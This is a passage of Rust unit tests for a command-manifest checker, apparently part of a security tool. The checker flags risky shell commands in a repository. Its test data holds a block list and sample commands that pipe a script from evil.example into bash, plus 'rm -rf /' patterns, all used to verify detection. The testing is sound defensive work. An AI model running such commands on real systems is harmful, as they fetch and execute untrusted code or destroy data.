    fn duplicate_dangerous_pattern_is_rejected() {
        // CodeRabbit R11 #5: a duplicated dangerous glob is pure redundancy and
        // almost always a copy-paste mistake — reject it at load.
        let dup = "dangerous:\n  - pattern: \"curl * | bash\"\n  - pattern: \"curl * | bash\"\n    action: warn\n";
        let err = CommandsManifest::from_yaml(dup)
            .expect_err("a duplicate dangerous[].pattern must be a parse error");
        assert!(
            matches!(&err, ManifestError::Parse(msg) if msg.contains("duplicate dangerous[].pattern")),
            "got {err:?}"
        );
        // Distinct patterns still parse.
        let ok = "dangerous:\n  - pattern: \"curl * | bash\"\n  - pattern: \"rm -rf *\"\n";
        let m = CommandsManifest::from_yaml(ok).expect("distinct patterns parse");
        assert_eq!(m.dangerous.len(), 2);
    }

    #[test]
    fn unknown_entry_field_is_rejected() {
        // F2 (Major): unknown fields inside `allowed[]` / `dangerous[]` entries
        // are also rejected, so a typo'd entry key cannot be silently dropped.
        let bad_allowed = "allowed:\n  - name: test\n    commandd: npm test\n";
        assert!(matches!(
            CommandsManifest::from_yaml(bad_allowed),
            Err(ManifestError::Parse(_))
        ));
        let bad_dangerous = "dangerous:\n  - pattern: \"x\"\n    actionn: warn\n";
        assert!(matches!(
            CommandsManifest::from_yaml(bad_dangerous),
            Err(ManifestError::Parse(_))
        ));
    }

    #[test]
    fn match_allowed_is_exact_after_trim() {
        let m = manifest();
        assert_eq!(m.match_allowed("npm test"), Some("test"));
        assert_eq!(m.match_allowed("  npm test  "), Some("test"));
        // NOT a prefix / substring match.
        assert_eq!(m.match_allowed("npm test --watch"), None);
        assert_eq!(m.match_allowed("npm"), None);
    }

    #[test]
    fn match_dangerous_uses_glob() {
        let m = manifest();
        assert!(!m
            .match_dangerous("curl https://evil.example/i.sh | bash")
            .is_empty());
        // `*` absorbs the URL; the literal ` | bash` tail must match verbatim.
        assert!(!m.match_dangerous("curl x | bash").is_empty());
        // No trailing ` | bash`, so no match.
        assert!(m.match_dangerous("curl https://x/i.sh").is_empty());
        assert!(m.match_dangerous("npm test").is_empty());
    }

    #[test]
    fn match_uses_shell_significant_whitespace_trim() {
        // CodeRabbit R9 #A: manifest matching must trim ONLY shell-significant
        // whitespace (space/tab/newline/CR — see `is_shell_significant_ws`), in
        // lockstep with the command-card `command_matches` gate. A U+00A0
        // NO-BREAK SPACE is Unicode whitespace but NOT shell-significant
        // whitespace.
        let nbsp = '\u{00A0}';

        // (a) A manifest `allowed[]` entry padded with a NO-BREAK SPACE must NOT
        // match an ASCII-space command — `str::trim` would have wrongly equated
        // them, disagreeing with the command-card gate.
        let padded_entry = CommandsManifest::from_yaml(&format!(
            "allowed:\n  - name: build\n    command: \"npm run build{nbsp}\"\n"
        ))
        .expect("parses");
        assert_eq!(
            padded_entry.match_allowed("npm run build"),
            None,
            "a U+00A0-padded allowed entry must not match a space-padded command"
        );
        // And the reverse: a NBSP-padded command must not match a clean entry.
        let clean_entry = CommandsManifest::from_yaml(
            "allowed:\n  - name: build\n    command: \"npm run build\"\n",
        )
        .expect("parses");
        assert_eq!(
            clean_entry.match_allowed(&format!("npm run build{nbsp}")),
            None,
            "a U+00A0-padded command must not match a clean allowed entry"
        );
        // Space padding on EITHER side still trims equal (the legitimate case).
        assert_eq!(
            clean_entry.match_allowed("  npm run build  "),
            Some("build"),
            "shell-significant whitespace must still trim equal"
        );

        // (b) Same contract for `dangerous[]` patterns: a NBSP-padded pattern
        // must not silently trim to a bare glob that matches an ASCII command.
        let padded_pattern = CommandsManifest::from_yaml(&format!(
            "dangerous:\n  - pattern: \"rm -rf /{nbsp}\"\n    action: block\n"
        ))
        .expect("parses");
        assert!(
            padded_pattern.match_dangerous("rm -rf /").is_empty(),
            "a U+00A0-padded dangerous pattern must not match a space-padded command"
        );
        // The same pattern WITHOUT the NBSP matches (proves the padding is the
        // sole reason for the miss above, not an unrelated glob failure).
        let clean_pattern = CommandsManifest::from_yaml(
            "dangerous:\n  - pattern: \"rm -rf /\"\n    action: block\n",
        )
        .expect("parses");
        assert!(
            !clean_pattern.match_dangerous("rm -rf /").is_empty(),
            "the equivalent un-padded pattern must still match"
        );
    }

    #[test]
    fn glob_match_semantics() {
        assert!(glob_match("*", ""));
        assert!(glob_match("*", "anything at all"));
        assert!(glob_match("curl * | bash", "curl x | bash"));
        assert!(glob_match("curl * | bash", "curl  | bash"));
        assert!(glob_match("a*b*c", "axxbyyc"));
        assert!(glob_match("abc", "abc"));
        assert!(!glob_match("abc", "abcd"));
        assert!(!glob_match("a*c", "ab"));
        // Anchored: a leading literal must match from the start.
        assert!(!glob_match("bash", "curl | bash"));
        // Non-ASCII safe.
        assert!(glob_match("п*т", "привет"));
    }

    #[test]
    fn evaluate_uncatalogued_emits_unknown_info() {
        let m = manifest();
        let out = m.evaluate("ls -la", &[]);
        assert_eq!(out.matched_allowed_name, None);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandUnknown);
        assert_eq!(out.findings[0].severity, Severity::Info);
    }

    #[test]
    fn evaluate_allowed_suppresses_unknown() {
        let m = manifest();
        let out = m.evaluate("npm test", &[]);
        assert_eq!(out.matched_allowed_name.as_deref(), Some("test"));
        // Sole suppression: nothing emitted, and crucially no RepoCommandUnknown.
        assert!(out.findings.is_empty());
    }

    #[test]
    fn finding_evidence_uses_shell_significant_whitespace_trim() {
        // CodeRabbit R12 #G: the finding evidence `matched`/`pattern` strings must
        // be trimmed of shell-significant whitespace, in lockstep with the
        // matcher — so the reported evidence is exactly what (mis)matched. A
        // U+00A0 NO-BREAK SPACE is Unicode whitespace but NOT shell-significant
        // whitespace: it must SURVIVE in the evidence (a Unicode `str::trim`
        // would have stripped it, diverging from the matcher which kept it).
        let nbsp = '\u{a0}';

        // (a) Uncatalogued-command Info note: the command keeps its NBSP padding.
        let m = manifest();
        let padded_cmd = format!("ls -la{nbsp}");
        let out = m.evaluate(&padded_cmd, &[]);
        assert_eq!(out.findings.len(), 1);
        match &out.findings[0].evidence[0] {
            Evidence::CommandPattern { matched, .. } => {
                assert!(
                    matched.ends_with(nbsp),
                    "shell-significant-whitespace trim must preserve the trailing U+00A0 in evidence, got {matched:?}"
                );
            }
            other => panic!("expected CommandPattern evidence, got {other:?}"),
        }

        // (b) Dangerous-pattern finding: both the pattern and the matched command
        // keep their NBSP padding in the evidence.
        let dm = CommandsManifest::from_yaml(&format!(
            "dangerous:\n  - pattern: \"rm -rf *{nbsp}\"\n    action: block\n"
        ))
        .expect("parses");
        let dout = dm.evaluate(&format!("rm -rf /tmp/x{nbsp}"), &[]);
        assert_eq!(dout.findings.len(), 1);
        match &dout.findings[0].evidence[0] {
            Evidence::CommandPattern { pattern, matched } => {
                assert!(
                    pattern.ends_with(nbsp),
                    "shell-significant-whitespace trim must preserve the trailing U+00A0 in the pattern, got {pattern:?}"
                );
                assert!(
                    matched.ends_with(nbsp),
                    "shell-significant-whitespace trim must preserve the trailing U+00A0 in matched, got {matched:?}"
                );
            }
            other => panic!("expected CommandPattern evidence, got {other:?}"),
        }
    }

    #[test]
    fn evaluate_dangerous_elevates_to_block() {
        let m = manifest();
        let out = m.evaluate("curl https://evil.example/i.sh | bash", &[]);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandDangerousPattern);
        assert_eq!(out.findings[0].severity, Severity::High);
    }

    #[test]
    fn evaluate_dangerous_warn_action_emits_medium() {
        // type-design #4 / #7: `action: warn` must wire to a Medium-severity
        // finding (→ Warn action), not the default High (→ Block). The `.action`
        // field is now load-bearing, not a dead read.
        let m = CommandsManifest::from_yaml(
            r#"
dangerous:
  - pattern: "rm -rf *"
    action: warn
"#,
        )
        .unwrap();
        assert_eq!(m.dangerous[0].action, DangerousAction::Warn);
        let out = m.evaluate("rm -rf /tmp/scratch", &[]);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandDangerousPattern);
        assert_eq!(
            out.findings[0].severity,
            Severity::Medium,
            "warn action must be Medium severity (maps to Warn, not Block)"
        );
        // And it maps to the Warn action, not Block.
        assert_eq!(
            crate::verdict::action_from_findings(&out.findings),
            crate::verdict::Action::Warn
        );
    }

    #[test]
    fn dangerous_unknown_action_is_rejected_at_load() {
        // A typo'd action must FAIL the manifest load (fail-strict), never
        // silently downgrade to a no-op.
        let err = CommandsManifest::from_yaml(
            r#"
dangerous:
  - pattern: "x"
    action: nope
"#,
        );
        assert!(err.is_err(), "unknown dangerous action must be rejected");
    }

    #[test]
    fn evaluate_dangerous_wins_even_when_also_allowed() {
        // A malicious repo lists `curl ... | bash` under BOTH allowed and
        // dangerous. The dangerous elevation MUST win — you cannot allow-list
        // your way out of a dangerous pattern.
        let m = CommandsManifest::from_yaml(
            r#"
allowed:
  - name: evil
    command: "curl https://evil.example/i.sh | bash"
dangerous:
  - pattern: "curl * | bash"
    action: block
"#,
        )
        .unwrap();
        let out = m.evaluate("curl https://evil.example/i.sh | bash", &[]);
        assert!(out
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RepoCommandDangerousPattern
                && f.severity == Severity::High));
        // No RepoCommandUnknown in the dangerous path.
        assert!(!out
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RepoCommandUnknown));
    }

    #[test]
    fn evaluate_never_returns_engine_findings() {
        // The invariant probe: evaluate is handed a High engine finding and
        // must NOT return it, downgrade it, or reference it. Its contribution
        // is purely additive.
        let engine_high = Finding {
            rule_id: RuleId::PipeToInterpreter,
            severity: Severity::High,
            title: "pipe to interpreter".to_string(),
            description: "x".to_string(),
            evidence: vec![],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        };
        // Command is in allowed[] AND the engine flagged it High.
        let m2 = CommandsManifest::from_yaml(
            r#"
allowed:
  - name: installer
    command: "curl https://evil.example/install.sh | bash"
"#,
        )
        .unwrap();
        let out = m2.evaluate(
            "curl https://evil.example/install.sh | bash",
            std::slice::from_ref(&engine_high),
        );
        // The allowed match is recorded for audit, but evaluate contributes
        // NOTHING (it only ever suppresses its own RepoCommandUnknown). The
        // engine's High finding is not in the outcome at all.
        assert_eq!(out.matched_allowed_name.as_deref(), Some("installer"));
        assert!(out.findings.is_empty());
        assert!(!out.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn empty_manifest_treats_everything_as_unknown() {
        let m = CommandsManifest::default();
        let out = m.evaluate("anything", &[]);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandUnknown);
    }

    #[test]
    fn malformed_yaml_is_parse_error() {
        let err = CommandsManifest::from_yaml("allowed: [this is not valid");
        assert!(err.is_err());
    }

    #[test]
    fn cached_load_hits_then_remits_on_mtime_change() {
        use std::io::Write as _;

        // P2: discover() is hot-path; cached_load caches by (path, mtime) with a
        // 5s TTL. Prove (a) a second load of an UNCHANGED file returns the
        // cached parse (does not observe a sneaky out-of-band content change
        // while the file's identity/mtime are unchanged), and (b) an mtime bump
        // forces a re-read that reflects the new content.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("commands.yaml");

        std::fs::write(
            &path,
            "allowed:\n  - name: a\n    command: cmd-a\ndangerous: []\n",
        )
        .unwrap();

        // Isolate from any sibling test that touched the global cache.
        invalidate_cache();

        let first = cached_load(&path).unwrap();
        assert_eq!(first.allowed.len(), 1);
        assert_eq!(first.allowed[0].name, "a");
        let mtime_before = manifest_mtime_nanos(&path);

        // A second load while the file is unchanged returns the SAME parse from
        // cache (cheap hit) — this is the perf win we are pinning.
        let cached = cached_load(&path).unwrap();
        assert_eq!(cached.allowed[0].command, "cmd-a");

        // Now change the content AND ensure the OS-reported mtime actually
        // advanced before asserting a re-read. Spin (bounded) rather than a
        // fixed sleep so the test is robust to coarse mtime granularity.
        let mut tries = 0;
        loop {
            let mut f = std::fs::File::create(&path).unwrap();
            f.write_all(b"allowed:\n  - name: b\n    command: cmd-b\ndangerous: []\n")
                .unwrap();
            f.sync_all().unwrap();
            drop(f);
            if manifest_mtime_nanos(&path) != mtime_before {
                break;
            }
            tries += 1;
            assert!(tries < 1000, "mtime never advanced after rewrite");
            std::thread::yield_now();
        }

        // The mtime changed, so the cache entry is stale: cached_load re-reads
        // and reflects the new content (NOT the cached `a`).
        let after = cached_load(&path).unwrap();
        assert_eq!(
            after.allowed[0].name, "b",
            "an mtime bump must invalidate the cache and re-read the manifest"
        );
        assert_eq!(after.allowed[0].command, "cmd-b");

        invalidate_cache();
    }

    /// CodeRabbit R17 #1 (read-guard class): `load_from_path` is on the exec hot
    /// path and reads a REPO-controlled `.tirith/commands.yaml`. A FIFO/device at
    /// that path must be REJECTED promptly (a fail-safe parse error) — NOT block
    /// the open forever waiting for a writer, which a plain `read_to_string`
    /// would. Unix-only (needs `mkfifo`); cannot hang — the hardened reader's
    /// `O_NONBLOCK` open returns immediately on a FIFO.
    #[cfg(unix)]
    #[test]
    fn load_from_path_on_fifo_does_not_hang_and_errors() {
        use std::ffi::CString;

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("commands.yaml");
        let c_path = CString::new(path.as_os_str().to_str().unwrap()).unwrap();
        // SAFETY: a single libc mkfifo with a valid C string and a standard mode.
        if unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) } != 0 {
            eprintln!("skipping: mkfifo unsupported here");
            return;
        }

        // Must return promptly with an error (a blocking read would hang here).
        let err = CommandsManifest::load_from_path(&path);
        assert!(
            err.is_err(),
            "a FIFO manifest path must error, not be parsed (or block)"
        );
        // And the FIFO is left intact (the read never consumed/replaced it).
        use std::os::unix::fs::FileTypeExt;
        assert!(
            std::fs::symlink_metadata(&path)
                .unwrap()
                .file_type()
                .is_fifo(),
            "the manifest path must be left as the FIFO it was"
        );
    }

    /// CodeRabbit R19 #1: a PRESENT-but-not-a-regular-file `.tirith/commands.yaml`
    /// (a directory, a FIFO, or a dangling symlink) must be treated as PRESENT —
    /// discovery STOPS there and `discover` surfaces a parse error — NOT silently
    /// skipped as if no manifest existed (which would drop the suppression-bounded
    /// note AND the dangerous-glob enforcement). Old `is_file()` presence detection
    /// coerced all three to `false`; the fix uses `symlink_metadata`. Unix-only
    /// (needs `mkfifo`/symlink); a `.git` marker bounds the walk-up so the probe
    /// can never escape into a real ancestor `.tirith/commands.yaml`.
    #[cfg(unix)]
    #[test]
    fn manifest_path_present_treats_stat_errors_as_present_not_absent() {
        // CodeRabbit R13f: only a genuine NotFound is "absent". Any OTHER
        // symlink_metadata error (EACCES, ENOTDIR, symlink loop) means a
        // present-but-unstattable entry, which must read as PRESENT so discovery
        // surfaces the unloadable manifest rather than silently walking past it.
        let dir = tempfile::tempdir().unwrap();
        // Genuinely absent → false.
        assert!(!manifest_path_present(&dir.path().join("nope.yaml")));
        // A path UNDER a regular file yields ENOTDIR (a non-NotFound stat error) →
        // must read as present.
        let not_a_dir = dir.path().join("not-a-dir");
        std::fs::write(&not_a_dir, b"x").unwrap();
        assert!(
            manifest_path_present(&not_a_dir.join("commands.yaml")),
            "an ENOTDIR (present-but-unstattable) path must read as present"
        );
        // A real file and a dangling symlink both lstat-succeed → present.
        assert!(manifest_path_present(&not_a_dir));
        let link = dir.path().join("dangling");
        std::os::unix::fs::symlink(dir.path().join("missing"), &link).unwrap();
        assert!(
            manifest_path_present(&link),
            "a dangling symlink lstat-succeeds → present"
        );
    }

    #[cfg(unix)]
    #[test]
    fn present_but_broken_manifest_is_not_silently_skipped() {
        use std::ffi::CString;

        // A non-broken control: with NO `.tirith/commands.yaml` and a `.git`
        // boundary, discovery finds nothing (returns absent) — the baseline the
        // three broken kinds must differ from.
        let absent = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(absent.path().join(".git")).unwrap();
        let absent_cwd = absent.path().to_str().unwrap();
        assert!(
            discover_manifest_path(Some(absent_cwd)).is_none(),
            "a repo with no manifest must discover as absent"
        );
        assert!(
            CommandsManifest::discover(Some(absent_cwd))
                .unwrap()
                .is_none(),
            "no manifest must yield Ok(None), not an error"
        );

        // Helper: build an isolated repo whose `.tirith/` exists, run `setup`
        // to create the broken `commands.yaml` entry, then assert PRESENCE
        // (discovery stops here) and that `discover` surfaces an Err.
        fn assert_present_and_errors(setup: impl FnOnce(&Path)) {
            let dir = tempfile::tempdir().unwrap();
            std::fs::create_dir_all(dir.path().join(".git")).unwrap();
            let tdir = dir.path().join(".tirith");
            std::fs::create_dir_all(&tdir).unwrap();
            setup(&tdir.join(MANIFEST_FILENAME));

            let cwd = dir.path().to_str().unwrap();
            let found = discover_manifest_path(Some(cwd));
            assert!(
                found.is_some(),
                "a present-but-broken manifest entry must STOP discovery (be PRESENT), not be skipped"
            );
            invalidate_cache();
            assert!(
                CommandsManifest::discover(Some(cwd)).is_err(),
                "a present-but-broken manifest must surface a (fail-safe) error, not Ok(None)"
            );
            invalidate_cache();
        }

        // (a) the manifest path is a DIRECTORY.
        assert_present_and_errors(|p| std::fs::create_dir_all(p).unwrap());

        // (b) the manifest path is a DANGLING SYMLINK (target does not exist).
        assert_present_and_errors(|p| {
            std::os::unix::fs::symlink("/nonexistent-tirith-target", p).unwrap();
        });

        // (c) the manifest path is a FIFO.
        assert_present_and_errors(|p| {
            let c_path = CString::new(p.as_os_str().to_str().unwrap()).unwrap();
            // SAFETY: a single libc mkfifo with a valid C string and standard mode.
            assert_eq!(
                unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) },
                0,
                "mkfifo must succeed for this test"
            );
        });
    }
}
